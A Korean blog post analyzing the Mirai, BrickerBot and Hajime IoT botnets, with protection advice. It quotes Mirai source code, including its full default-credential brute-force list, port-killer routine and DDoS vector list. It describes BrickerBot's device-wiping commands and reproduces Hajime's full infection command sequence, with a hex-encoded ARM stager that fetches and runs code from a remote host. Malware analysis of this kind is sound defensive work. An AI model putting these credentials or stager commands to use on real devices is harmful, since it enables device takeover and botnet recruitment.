---
layout: post
title:  "IoT Botnet Analysis"
tag:   Analysis
categories: IoT persu
modified: 2017-04-26
comments: true
featured: true
---

# 개요
해당 글은 IoT botnet의 종류에 대해 조사한 내용입니다. 자세한 내용은 원문을 참고해 주시길 바랍니다.

### IoT Device가 DDoS Botnet 으로  매력적인 이유
1. EndPoint 보안의 부재
2. IoT Device의 안전 및 보안에 관한 규정이나 표준이 부재하여 기본 암호 정책, 액세스 제어 권한, 보안 구성과 같은 설정이 미흡
3. 24시간 * 365일 사용이 가능
4. 0-day Attack이 비교적 쉬우므로 빠른 감염이 가능


# 1. Mirai Botnet

- 원문(Reference) : https://security.radware.com/ddos-threats-attacks/threat-advisories-attack-reports/mirai-botnet/

Mirai Botnet은 대규모 DDoS 공격을 3건 발생시켰으며, 강력하고 정교한 방식으로 DDos를 발생시킨다.

Mirai Botnet은 1TB 급 트래픽 발생을 통해 공격 서비스 거부시킬 수 있으며, 공격 방식은 미리 정의된 10가지 벡터가 존재한다.
그중 GRE Flood, TCP STOMP, Water Torture, DNS Query 호출과 같은 공격 벡터가 존재하게 된다.

## 1.1 Target
일차적으로 공격 대상은 공인 망에 23번 Telnet 포트가 오픈된 IoT Device이다. 그중 mirai botnet은 auth_entry에 존재하는 디폴트 계정을 가진 IoT Device가 대상이며, 더 나아가 dropbear SSH 와 같이 22번 포트가 오픈된 IoT Device 또한 공격의 대상이 되기도 한다.

## 1.2 Mirai botnet 동작과정

- 구현을 통한 분석 : https://www.rsaconference.com/writable/presentations/file_upload/hta-w10-mirai-and-iot-botnet-analysis.pdf

### 1.1.1 brute force을 통한 IoT Device 접근

Mirai Botnet은 기본적으로 공인 IP를 가진 IoT Device에 SSH, Telnet 포트와 같이 원격에서 시스템에 접근 가능한 서비스를 스캔하게 되고 오픈된 서비스에 대해서 미리 정의된 디폴트 계정을 brute force 공격을 하게 된다.

- Telmet, SSH brute force : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/scanner.c

```c
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          // admin    (none)
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              // root     pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);      // admin    admin1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                              // root     1111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);          // admin    smcadmin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                          // admin    1111
    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                      // root     666666
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);              // root     password
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                              // root     1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                      // root     klv123
    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1); // Administrator admin
    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);      // service  service
    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 1); // supervisor supervisor
    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                      // guest    guest
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);      // admin1   password
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1); // administrator 1234
    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);              // 666666   666666
    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);              // 888888   888888
    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                              // ubnt     ubnt
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                  // root     klv1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                      // root     Zte521
    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                      // root     hi3518
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                          // root     jvbzd
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                              // root     anko
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                          // root     zlxx.
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1); // root     7ujMko0vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // root     7ujMko0admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                      // root     system
    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                              // root     ikwb
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);              // root     dreambox
    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                              // root     user
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                  // root     realtek
    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);              // root     00000000
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);              // admin    1111111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                      // admin    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                      // admin    54321
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                  // admin    123456
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // admin    7ujMko0admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
```

위 내용을 통해 다양한 디폴트 계정을 가지고 있는 것을 알 수 있다.

### 1.1.2 Find CPU info

위 디폴트 계정을 통해 shell에 접근하게 되면, Botnet을 생성하기 위해 CPU 버전을 아래 그림과 같이 확인하게 된다. MIPS, ARM, x86 etc...

<img src="{{ site.url }}/images/persu/mirai.png" style="display: block; margin: auto;">

### 1.1.3 Mirai Botnet Download
1, 2 번 단계를 거치게 되면 실제로 Botnet을 내려받게 되는데 /bin/busybox 에서 wget, tftp, ECCHI 명령어가 실행되는지 찾게 된다.

<img src="{{ site.url }}/images/persu/mirai0.png" style="display: block; margin: auto;">

만약 위의 명령어가 없을 시 echo -ne 명령어를 통해 "upnp" 라는 바이너리를 만들게 된다. (이거 보통 삽질 아님....)

<img src="{{ site.url }}/images/persu/mirai1.png" style="display: block; margin: auto;">

### 1.1.4 Start Mirai Botnet
3번 과정을 통해 Mirai Botnet을 내려받은 이후에는 실행하게 된다.

<img src="{{ site.url }}/images/persu/mirai2.png" style="display: block; margin: auto;">

### 1.1.5 Port Kill & restart
Mirai botnet이 실행하면 처음 기존에 활성화 되었던 Telnet, SSH, HTTP 서비스를 kill 후 restart를 한다.

Telnet, SSH, HTTP Kill : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/killer.c

```c
// Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
#ifdef DEBUG
    printf("[killer] Trying to kill port 23\n");
#endif
    if (killer_kill_by_port(htons(23)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/23 (telnet)\n");
#endif
    } else {
#ifdef DEBUG
        printf("[killer] Failed to kill port 23\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/23 (telnet)\n");
#endif
#endif
```

### 1.1.6 Command & Control
C&C 서버는 활성화된 Telnet, SSH 포트를 통해 명령을 전송하게 된다.

기본적으로 TCP SYN, ACK Flooding과 같은 기본적인 DDoS 공격 벡터뿐만 아니라 새롭게 발견되고 있는 GRE IP, Ethernet Flooding 또한 공격 벡터에 가지고 있다. DDoS 탐지 기법을 우회하는 공격 벡터까지 구성된다.

- DDoS vector : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/attack.h

```
#define ATK_VEC_UDP        0  /* Straight up UDP flood */
#define ATK_VEC_VSE        1  /* Valve Source Engine query flood */
#define ATK_VEC_DNS        2  /* DNS water torture */
#define ATK_VEC_SYN        3  /* SYN flood with options */
#define ATK_VEC_ACK        4  /* ACK flood */
#define ATK_VEC_STOMP      5  /* ACK flood to bypass mitigation devices */
#define ATK_VEC_GREIP      6  /* GRE IP flood */
#define ATK_VEC_GREETH     7  /* GRE Ethernet flood */
//#define ATK_VEC_PROXY      8  /* Proxy knockback connection */
#define ATK_VEC_UDP_PLAIN  9  /* Plain UDP flood optimized for speed */
#define ATK_VEC_HTTP       10 /* HTTP layer 7 flood */
```

## 1.2 Protecting
mirai botnet은 알려진 디폴트 계정을 통해 시스템에 접근하게 되는 것이다. 원천적인 보안 방법은 Telnet, SSH 와 같은 원격 관리 서비스를 공인 IP에 오픈하지 않는 것이 중요하며, 제조사는 각 디바이스별 강력한 비밀번호 정책을 적용한 유니크한 디폴트 계정을 통해 단말을 관리해야 한다.

# 2. Bricker Botnet

- 원문 : https://security.radware.com/ddos-threats-attacks/brickerbot-pdos-permanent-denial-of-service/
https://security.radware.com/ddos-threats-attacks/brickerbot-pdos-back-with-vengeance/

IoT 시대에서 많은 Device가 점차 인터넷을 사용하게 되는 초연결 사회가 이뤄지고 있다. 이런 IoT의 가용성을 해치는 PDoS 공격이 급증하고 있다.

- PDoS(Permanent Denial of Service attacks) : 영구적인 서비스 거부 공격

이러한 PDoS 공격은 시스템을 손상해 하드웨어를 교체하거나 다시 설치해야 하는 공격이다. 시스템을 과부하를 일으키는 DDoS와는 약간 다른 형태의 DoS다.

1,895 건의 PDoS 공격을 일으킨 Bricker_Botnet은 최초 두 차례 공격 시도를 하였으며, C&C 서버는 TOR Node에 의해 발견되지 않았다.

## 2.1 Target
일차적으로 공격 대상은 공인 망에 23번 Telnet 포트된 IoT Device다. 그 중 Mirai_Bot에 존재하는 auth_entry에 존재하는 디폴트 계정을 가진 IoT Device 이며, 더 나아가 dropbear SSH 와 같이 22번 포트가 오픈되어 있는 IoT Device 또한 공격의 대상이 되기도 한다.


## 2.2 Bricker Botnet 동작 과정

### 2.2.1 brute force을 통한 IoT Device 접근
Bricker_Bot의 공격 방식은 "Telnet brute force" 에서 부터 시작된다. Telnet brute force은 Mirai에서 사용된 것과 같은 공격 방식이며, 아래 github에서 내용을 확인할 수 있다.

- Mirai code : https://github.com/jgamblin/Mirai-Source-Code

Telnet brute force 방식에 사용되었던 auth_entry는 아래 소스 코드에서 확인할 수 있다.

- Telmet brute force : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/scanner.c

```c

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
    ...
```

기본적인 Telnet을 접속하기 위해 TCP/IP Protocol Header를 구성하고, add_auth_entry에 있는 IoT Device의 디폴트 계정에 접근하게 구성하였다.

"Telnet brute force"를 통해 시스템에 접근하게 되면(shell 접근을 의미) 장치 손상(Corrupting a Device)을 입히게 된다.

### 2.2.2 linux command를 통한 PDos
시스템에 접근하게 되면 botnet은 linux command를 통해 시스템을 마비시키게 되는데, bricker botnet 공격 4번 중 각각 다른 linux command를 통해 PDoS를 발생시켰다.

#### 2.2.2.1 BrickerBot.1

PDos의 가장 큰 목적인 장치 손상은 Linux shell command를 실행 시켜 인터넷 연결, 장치 성능이 정의된 파일을 지우는 명령을 수행한다.

<img src="{{ site.url }}/images/persu/brickerbot1.jpg" style="display: block; margin: auto;">

플래시 카드, 메모리 등 표준과 일치하는 저장 매체가 랜덤한 값으로 덮어 쓰이게 된다.
이후 route del을 통해 routing table을 삭제하게 된다. 이럴 경우 리눅스는 다시 routing 작업을 시행하게 되는데 이를 막기 위해 sysctl 명령을 통해 커널 매개 변수를 조작하게 된다.

- net.ipv4.tcp_timestamps=0 : TCP timestamps를 0으로 설정 WAN 구간에서 네트워크가 안되는 현상 발생
- kernel.threads-max=1 : 커널에서 발생할 수 있는 최대 스레드를 1로 설정

이렇게 되면 저장매체에 있는 데이터는 임의의 값으로 초기화가 될 것이며, 네트워크 통신 또한 이뤄지지 않게 된다.

#### 2.2.2.2 BrickerBot.2

전 세계적으로 한 번에 333 여 곳에서 PDoS를 발생시킨, 다음 명령 수행을 하는 bricker_bot.2는 아래와 같다.

<img src="{{ site.url }}/images/persu/brickerbot2.jpg" style="display: block; margin: auto;">

rm -rf 를 통해 모든 장치를 지워버리며, TCP timestamps 비활성화, 커널 스레드 최대 수 1로 지정하며 iptables를 초기화하며 NAT 규칙까지 삭제하고 out-bound packet을 차단하게 되어 네트워크 통신이 이뤄지지 않도록 구성한다.

#### 2.2.2.3 BrickerBot.3

<img src="{{ site.url }}/images/persu/brickerbot4.png" style="display: block; margin: auto;">

BrickerBot.3은 기존의 BrickerBot.1의 "fdisk -l" 명령어가 삭제되었으며 랜덤한 값으로 덮어 쓰이는 저장 매체의 수가 증가하였다.

#### 2.2.2.4 BrickerBot.4
<img src="{{ site.url }}/images/persu/brickerbot5.png" style="display: block; margin: auto;">

BrickerBot.4은 BrickerBot.1과 거의 같은 명령을 수행한다.

## 2.3 Timeline
최초 두 PDoS 공격은 같은 날과 거의 같은 시간에 시작되었다.
- 2017년 3월 20일 9.51 PM : 첫 번째 PDoS 공격은 BrickerBot.1을 통해 발생 후 종료
- 2017년 3월 20일 9.10 PM : TOR 노드를 사용하여 PDoS 공격이 BrickerBot.2을 통해 지속해서 발생

이후 한 달 정도 지난 후 추가 공격이 발견되었다.
- 2017년 4월 21일 12.00 PM : Dropbear SSH server (SSH-2.0-dropbear_0.51, 2013.58, 2014.63) 대상으로 12시간 동안 1118회의 BrickerBot.3 발생
- 2017년 4월 21일 5.22 PM - 8.44 PM : 약 90회 정도 단일 장치에서만 일어났으며, 그 중 Dropbear SSH server (SSH-2.0-dropbear_2014.63) 버전이 다수 사용한 BrickerBot.4 발생

## 2.4 Protecting
BrickerBot 감염을 막기 위해서는 가장 기본적인 대응방안이 필요하다. 각 Device는 Telnet, SSH와 같은 원격 단말 관리 서비스를 비활성화시켜야 하며, 필요 때문에 활성화 시킬 경우 각 Device 별로 유니크한 패스워드 정책을 수립해야 한다. 특히 SSH 사용 시 로그인 방식이 아닌 키교환을 통해 로그인할 수 있도록 구성해야 한다.


# 3. Hajime Botnet

원문 : http://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/

2017년 4월 27일 16시 경 유명 보안 회사인 "Kaspersky Lab"에 따르면 신종 IoT botnet인 "Hajime"에 300,000 여 IoT Device가 감염되었다고 한다. (사용된 libutp에 2013년이라 표시됨)

이번 Hajime botnet은 2016년 10월 Rapinity Networks의 보안 연구원에 의해 처음 발견되었으며 꾸준히 퍼지고 있는 상황이다.

대부분 공격 대상은 웹캠, DVR으로 나타나고 있다. 국가별 통계는 베트남 20%, 대만 13%, 브라질 9% 정도로 나타나고 있다.

## 3.1 Hajime botnet 동작 과정

원문 : https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf

### 3.1.1 정찰
정찰 부분은 실제로 botnet이 감염된 것은 아니며, 실제 공격을 수행하는 attcking node가 무작위로 ipv4 대역 대의 23번 텔넷 포트를 스캔하게 된다.
이후 텔넷 오픈된 것을 확인하면 attacking node가 가지고 있는 알려진 디폴트 ID/PW를 대입하게 된다.

이때 Hajime botnet이 mirai botnet과 "Telnet brute force"공격에서 다른 점은 알려진 디폴트 ID/PW를 순차적으로 대입해보는 것이다. (mirai botnet의 경우 무작위 대입)

Telnet brute force를 통해 shell에 접근할 수 있으면 아래 5가지의 명령어를 실행한다.

```
enable
system
shell
sh
/bin/busybox ECCHI
```

위 명령 중 enable, system, shell, sh 4가지 명령은 shell을 실행시키기 위함이며, 마지막 /bin/busybox ECCHI를 통해 shell이 잘 실행되는지 파악하게 된다. 성공적인 shell 접근을 하기 위해 에러를 발생하는 것이며, mirai의 변형임을 나타나는 부분이기도 하다.

### 3.1.2 침투
정상적으로 IoT Device에 접근하게 되면 아래 명령을 실행하여 현재 시스템 마운트 상황을 확인하게 된다.

```
cat /proc/mounts; /bin/busybox ECCHI

rootfs / rootfs rw 0 0
/dev/root / jffs2 ro,noatime 0 0
/proc /proc proc rw,nodiratime 0 0
devpts /dev/pts devpts rw 0 0
none /tmp ramfs rw 0 0
/dev/mtdblock6 /tmp/flash jffs2 rw,sync,noatime 0 0
ECCHI: applet not found
```

이후 hajime botnet을 생성하기 위해 시스템 내 쓰기 권한이 있는 /proc, /sys, /var, /tmp, / 등 타겟 디렉터리를 찾는다. 이후 아래 명령을 실행하게 된다.

```
# cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox ECCHI
# /bin/busybox chmod 777 .s; /bin/busybox ECCHI
# cat .s; /bin/busybox ECCHI
# /bin/busybox ECCHI;
```

실제 IoT Device에서 테스트 결과 /tmp 디렉터리에 .s 파일이 생성된 것을 확인할 수 있었다.
```
# ls -al .s
-rwxrwxrwx    1 test     root       509436 Apr 28 23:56 .s
```

이 과정을 수행하는 이유는 3가지가 있다.
1. .s 바이너리의 유무 확인
2. 해당 디렉터리의 쓰기 가능 여부 확인
3. .s 바이너리를 생성함으로써 대상 IoT Device의 프로세서 결정

### 3.1.3 1차 감염 : shell code 생성
침투 단계에서 이상이 없을 시 hajime botnet을 생성하게 된다.
```
# echo -ne "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x54\x00\x01\x00\x34\x00\x00\x00\x44\x01\x00\x00\x00\x02\x00\x05\x34\x00\x20\x00\x01\x00\x28\x00\x04\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00" > .s; /bin/busybox ECCHI
# echo -ne "\x00\x00\x01\x00\xf8\x00\x00\x00\xf8\x00\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0\xe3\x07\x00\x2d\xe9\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60\xa0\xe1\x70\x10\x8f\xe2\x10\x20\xa0\xe3" >> .s; /bin/busybox ECCHI
# echo -ne "\x07\x00\x2d\xe9\x03\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x14\xd0\x8d\xe2\x4f\x4f\x4d\xe2\x05\x50\x45\xe0\x06\x00\xa0\xe1\x04\x10\xa0\xe1\x4b\x2f\xa0\xe3\x01\x3c\xa0\xe3\x0f\x00\x2d\xe9\x0a\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x10\xd0\x8d\xe2" >> .s; /bin/busybox ECCHI
# echo -ne "\x00\x50\x85\xe0\x00\x00\x50\xe3\x04\x00\x00\xda\x00\x20\xa0\xe1\x01\x00\xa0\xe3\x04\x10\xa0\xe1\x04\x00\x90\xef\xee\xff\xff\xea\x4f\xdf\x8d\xe2\x00\x00\x40\xe0\x01\x70\xa0\xe3\x00\x00\x00\xef\x02\x00\x12\x1c\xc6\x33\x64\x7b\x41\x2a\x00\x00\x00\x61\x65\x61" >> .s; /bin/busybox ECCHI
# echo -ne "\x62\x69\x00\x01\x20\x00\x00\x00\x05\x43\x6f\x72\x74\x65\x78\x2d\x41\x35\x00\x06\x0a\x07\x41\x08\x01\x09\x02\x0a\x03\x0c\x01\x2a\x01\x44\x01\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75" >> .s; /bin/busybox ECCHI
# echo -ne "\x74\x65\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x54\x00\x01\x00\x54\x00\x00\x00" >> .s; /bin/busybox ECCHI
# echo -ne "\xa4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x00\x00\x00\x2b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00" >> .s; /bin/busybox ECCHI
# echo -ne "\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x23\x01\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" >> .s; /bin/busybox ECCHI
# cp .s .i; >.i; ./.s>.i; ./.i; rm .s; /bin/busybox ECCHI
```

echo -ne 명령은 16진수(hex) 문자열을 바이너리 파일로 만들 때 사용하는 명령이다.

```
study persu$ file .s
.s: ERROR: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked error reading
study persu$ ls -al .s
-rw-r--r--  1 persu  staff  484  4 29 00:24 .s
```

file 명령어를 통해 확인 결과 ARM CPU에 맞게 바이너리가 구성된 것을 알 수 있다.
최종적으로 실제 hajime bonet이 484 byte의 ELF 파일로 만들어지게 된다.

<img src="{{ site.url }}/images/persu/arm.PNG" style="display: block; margin: auto;">

ARM 프로세서는 공부 중에 있어 완벽하게 이해를 못 한 상황이다(shell code인 걸로 추정). 원문을 통해 TCP 연결을 통해 byte date를 host로 보내고 수신된 모든 byte를 stdout으로 출력하는 것을 파악하였다. stdout은 .i 파일로 파이프 되어 실행되는 것을 알 수 있다.

hajime botnet hash : https://github.com/Psychotropos/hajime_hashes

### 3.1.4 2차 감염 : DHT Downloader
이 단계는 1차 감염 시 생성되었던 .i 바이너리가 P2P 네트워크에서 payload를 검색하고 명령을 수행하는 바이너리를 내려받고 실행하는 단계이다.

Hajime는 피어 검색 및 uTP(데이터 교환) 위해 BitTorrent의 DHT 프로토콜을 사용한다.

상세 과정 (수정이 필요...)
```
1. 자체 개발한 라이브러리 다운로드
2. 정보 교환을 위해 Hajime은 BitTorrent DHT 프로토콜 준비 (piggybacks on BitTorrent’s DHT overlay network)
3. Hajime은 피어와 함께 파일을 전송하기 위해 libutp에있는 uTP 구현
4. Hajime은 LZ4 방식으로 압축된 페이로드를 포함한 파일을 다운로드
5. 시그니처 핑거 프린팅을 통해 페이로드 파일을 식별
6. 메인 루틴인 KadNode 함수 내 conf_init와 conf_check를 통해 기본 할당 및 초기화를 담당
7. pool.ntp.org에 대한 쿼리로 결과를에서 오프셋으로 NTP 캐싱
8. 실행 후 프로세스 이름 변경 : 먼저, strcpy 함수를 사용
prctl (PR_SET_NAME,argv [0]) syscall. 을 통해 프로세스의 argv [0]에 "telnetd"문자열로 변환 -> 자신을 telent으로 속이기 위함 (.p / .d 프로세스가 telnet으로 변환)
```

### 3.1.5 실행

피어로부터 가장 최신의 설정 파일을 내려받기 위해 설정
BitTorrent DHT의 피어 조회 시 Torrent 메타 데이터의 SHA1 해시값을 생성하기 위해 160 비트 "info_hash" 값을 생성한다.

#### info_hash 생성 로직
1. 현재 UTC 정보 확인
2. D(며칠)-M(1월:0, 2월:1)-Y(현재년수 - 1900)-W(일요일:0, 금요일:6)-Z(x월x일-1월1일) 형식으로 UTC 정보 변환
- ex) Oct. 1, 2016, date as 1-9-116-6-274,
3. 하이픈 ('-')을 추가 해당 날짜의 16 진수 표현
4. 전체 문자열에 대한 SHA1 해시를 계산하여 info_hash 생성

uTP 프로토콜을 이용해 10분 마다 info_hash를 가진 피어에 도달하여 설정파일을 내려받고 파싱하게 된다.

```
[modules]
exp.arm5.1475686338
.i.arm5.1475781691
exp.x64.1476038380
exp.arm7.1476190023
.i.mipsel.1476038376
.i.arm7.1475797474
exp.mipsel.1476249252
[peers]
router.utorrent.com
router.bittorrent.com
```

info_hash를 가진 피어에 도달한 설정 파일의 모듈(바이너리)과 피어는 위 내용과 같다. (계속 변함)
모듈을 통해 다양한 프로세서를 지원하는 것을 알 수 있으며, ".(콤마)" 를 통해 파일이름, 모듈, 타임스탬프를 구분하게 된다.

위 모듈의 정보와 자신이 가지고 있는 모듈의 정보를 비교하여 최신 날짜의 모듈을 내려받게 된다.
